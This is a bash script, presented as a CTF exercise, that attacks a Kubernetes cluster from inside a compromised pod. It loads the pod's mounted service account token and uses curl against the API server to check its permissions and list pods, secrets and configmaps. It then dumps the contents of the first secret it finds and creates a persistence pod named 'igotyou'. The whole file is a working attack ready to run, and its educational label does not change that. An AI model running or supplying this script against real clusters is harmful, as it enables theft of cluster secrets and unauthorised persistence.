#!/bin/bash

# ==============================================================================
#      ** K8s Multi-Stage Attack Script (from within a pod) **
#
# This script simulates an attack path for a CTF challenge. It uses a
# compromised Service Account token to first perform reconnaissance and
# enumeration, and then attempts to deploy a payload pod for persistence.
#
# WARNING: For educational and testing purposes only.
# ==============================================================================

# --- Configuration ---
PAYLOAD_POD_NAME="igotyou"
CONTAINER_IMAGE="ubuntu:22.04"
CONTAINER_COMMAND='["sleep", "3600"]'

# --- Helper for pretty printing ---
echo_step() {
    echo " "
    echo "-----> 🧐 STEP: $1 <-----"
}

# ==============================================================================
# PHASE 1: AUTO-DISCOVERY & SETUP
# ==============================================================================
echo_step "Auto-Discovery and Setup"

# The namespace is automatically detected from the pod's environment
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
echo "[INFO] Detected Namespace: $NAMESPACE"

# API server address is injected as an environment variable by Kubernetes
APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
echo "[INFO] API Server URL: $APISERVER"

# Read the Service Account token from its default location
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo "[INFO] Service Account token loaded."

# Path to the cluster's CA certificate
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
CURL_OPTS=(-s --cacert "$CACERT" -H "Authorization: Bearer $TOKEN")

# ==============================================================================
# PHASE 2: RECONNAISSANCE & ENUMERATION
# ==============================================================================

# --- Check Permissions (Simulating 'kubectl auth can-i') ---
echo_step "Checking our permissions via SelfSubjectAccessReview API"

check_perm() {
    VERB=$1
    RESOURCE=$2
    RESPONSE=$(curl "${CURL_OPTS[@]}" -X POST -H 'Content-Type: application/json' \
    --data "{
        \"apiVersion\": \"authorization.k8s.io/v1\",
        \"kind\": \"SelfSubjectAccessReview\",
        \"spec\": {
            \"resourceAttributes\": {
                \"namespace\": \"$NAMESPACE\",
                \"verb\": \"$VERB\",
                \"resource\": \"$RESOURCE\"
            }
        }
    }" "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews")

    if echo "$RESPONSE" | grep -q '"allowed":true'; then
        echo "✅ PERMISSION GRANTED to '$VERB $RESOURCE'"
    else
        echo "❌ PERMISSION DENIED to '$VERB $RESOURCE'"
    fi
}

check_perm "list" "pods"
check_perm "list" "secrets"
check_perm "get" "secrets"
check_perm "list" "configmaps"
check_perm "create" "pods"


# --- Enumerate Resources ---
echo_step "Listing resources in the '$NAMESPACE' namespace"

echo "Listing Pods..."
curl "${CURL_OPTS[@]}" "$APISERVER/api/v1/namespaces/$NAMESPACE/pods" | sed 's/{"kind":/\n{"kind":/g' | grep "Pod" || echo "Could not list pods."

echo " "
echo "Listing Secrets..."
SECRETS_JSON=$(curl "${CURL_OPTS[@]}" "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets")
echo "$SECRETS_JSON" | sed 's/{"kind":/\n{"kind":/g' | grep "Secret" || echo "Could not list secrets."

echo " "
echo "Listing ConfigMaps..."
curl "${CURL_OPTS[@]}" "$APISERVER/api/v1/namespaces/$NAMESPACE/configmaps" | sed 's/{"kind":/\n{"kind":/g' | grep "ConfigMap" || echo "Could not list configmaps."


# --- Attempt to Get Secret Data ---
echo_step "Attempting to read data from the first available secret"

# A bit of shell magic to parse the secret name without needing jq
FIRST_SECRET_NAME=$(echo "$SECRETS_JSON" | grep -o '"name":"[^"]*' | head -n 1 | cut -d '"' -f 4)

if [ -n "$FIRST_SECRET_NAME" ]; then
    echo "[INFO] Found secret: '$FIRST_SECRET_NAME'. Attempting to read its content..."
    curl "${CURL_OPTS[@]}" "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets/$FIRST_SECRET_NAME"
else
    echo "[INFO] No secrets found to read."
fi


# ==============================================================================
# PHASE 3: PAYLOAD DEPLOYMENT
# ==============================================================================
echo_step "Attempting to deploy payload pod '$PAYLOAD_POD_NAME'"

HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  "${CURL_OPTS[@]}" \
  -H 'Content-Type: application/json' \
  -X POST \
  --data "{
      \"apiVersion\": \"v1\",
      \"kind\": \"Pod\",
      \"metadata\": {
          \"name\": \"$PAYLOAD_POD_NAME\"
      },
      \"spec\": {
          \"containers\": [
              {
                  \"name\": \"payload-container\",
                  \"image\": \"$CONTAINER_IMAGE\",
                  \"command\": $CONTAINER_COMMAND
              }
          ]
      }
  }" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/pods")

# --- Result ---
if [ "$HTTP_STATUS" -eq 201 ]; then
  echo "✅ SUCCESS! Payload pod '$PAYLOAD_POD_NAME' created (HTTP Status: $HTTP_STATUS)."
else
  echo "❌ FAILED! The API server returned an error (HTTP Status: $HTTP_STATUS)."
  echo "    This likely means the token does not have 'create pod' permissions."
fi

echo " "
echo "--- Script Finished ---"
